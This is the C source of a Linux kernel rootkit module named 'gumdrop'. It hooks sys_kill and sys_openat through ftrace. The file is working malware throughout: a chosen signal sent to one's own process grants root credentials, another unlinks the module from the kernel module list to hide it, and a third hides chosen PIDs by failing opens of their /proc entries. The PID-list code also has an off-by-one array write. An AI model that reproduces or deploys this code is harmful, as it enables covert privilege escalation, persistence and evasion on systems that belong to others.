#include "ftrace_helper.h"
#include <asm-generic/errno-base.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_ns.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ceald");
MODULE_DESCRIPTION("gumdrop rootkit");
MODULE_VERSION("0.2");

#define MAX_PIDS 64
static pid_t hidden_pids[MAX_PIDS];
static int HIDDEN_POS = 0;

static bool append(pid_t pid) {
  HIDDEN_POS++;
  if (HIDDEN_POS <= MAX_PIDS) {
    hidden_pids[HIDDEN_POS] = pid;
    return true;
  }
  HIDDEN_POS--;
  return false;
}
static bool remove_item(pid_t pid) {
  for (int i = 0; i < MAX_PIDS; i++) {
    if (hidden_pids[i] == pid) {
      hidden_pids[i] = 0;
      HIDDEN_POS--;
      return true;
    }
  }
  return false;
}

static struct list_head *module_previous;
static inline void tidy(void) {
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
}
static short sneaky_beaky_like = 0;
void sneaky_beaky(void) {
  // sneaky beaky time!
  printk(KERN_INFO "we going in sneaky beaky like!\n");
  module_previous = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  sneaky_beaky_like = 1; // YES sneaky beaky!
}

void not_sneaky_beaky(void) {
  printk(KERN_INFO "no sneaky beaky like :(\n");
  list_add(&THIS_MODULE->list, module_previous);
  sneaky_beaky_like = 0; // not sneaky beaky like :(
}

void give_woot(void) {
  struct cred *newcreds;
  newcreds = prepare_creds();
  if (newcreds == NULL) {
    printk(KERN_INFO "cannot get new creds\n");
    return;
  }
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) &&                           \
        defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) ||                           \
    LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
  newcreds->uid.val = newcreds->gid.val = 0;
  newcreds->euid.val = newcreds->egid.val = 0;
  newcreds->suid.val = newcreds->sgid.val = 0;
  newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
  newcreds->uid = newcreds->gid = 0;
  newcreds->euid = newcreds->egid = 0;
  newcreds->suid = newcreds->sgid = 0;
  newcreds->fsuid = newcreds->fsgid = 0;
#endif
  printk(KERN_INFO "gave woot!");
  commit_creds(newcreds);
}

// kill this.
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage int haha_funny_number(const struct pt_regs *regs) {
  int sig = regs->si;
  pid_t source_pid = current->pid;
  pid_t kill_this = (pid_t)regs->di;
  switch (sig) {
  case 42:
    if (source_pid == kill_this) {
      give_woot();
      return 0;
      break;
    }
    return orig_kill(regs);
  case 41:
    if (source_pid == kill_this) {
      if (sneaky_beaky_like == 0) {
        sneaky_beaky();
      } else {
        not_sneaky_beaky();
      }
      return 0;
    }
    return orig_kill(regs);
    break;
  case 64:
    if (kill_this == 0) {
      return orig_kill(regs);
    }
    printk(KERN_INFO "hiding: %d", kill_this);
    if (!remove_item(kill_this)) {
      printk(KERN_INFO "cannot remove pid from hidden list: %d", kill_this);
      if (!append(kill_this)) {
        printk(KERN_INFO "cannot add pid from hidden list: %d", kill_this);
        return -EPERM;
      }
    }
    return 0;
    break;
  default:
    return orig_kill(regs);
    break;
  }
  return 0;
}

bool exists(char item[]) {

  for (int i = 0; i < MAX_PIDS; i++) {
    char str[64];
    if (hidden_pids[i] != 0) {
      sprintf(str, "/proc/%d", hidden_pids[i]);
      if (strstr(item, str)) {
        return true;
      }
    }
  }
  return false;
}

// hook into __x64_sys_openat
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static int monitor_handle(const struct pt_regs *regs) {
  const char __user *user_filename;
  user_filename = (const char __user *)regs->si;
  char filename[256];
  long bytes;
  bytes = strncpy_from_user(filename, user_filename, sizeof(filename) - 1);
  user_filename = (const char __user *)regs->si;
  if (bytes > 0) {
    filename[bytes] = '\0';
    if (exists(filename)) {
      printk(KERN_INFO "process trying to access restricted process!\n");
      return -ENOENT;
    }
    return orig_openat(regs);
  }
  return orig_openat(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", haha_funny_number, &orig_kill),
    HOOK("sys_openat", monitor_handle, &orig_openat),
};

/* Module initialization function */
static int __init gumdrop_init(void) {
  /* Hook the syscall and print to the kernel buffer */
  int err;
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err)
    return err;

  printk(KERN_INFO "Hewo pwincess\n");

  return 0;
}

static void __exit gumdrop_exit(void) {
  /* Unhook and restore the syscall and print to the kernel buffer */
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "bye pwincess\n");
}

module_init(gumdrop_init);
module_exit(gumdrop_exit);
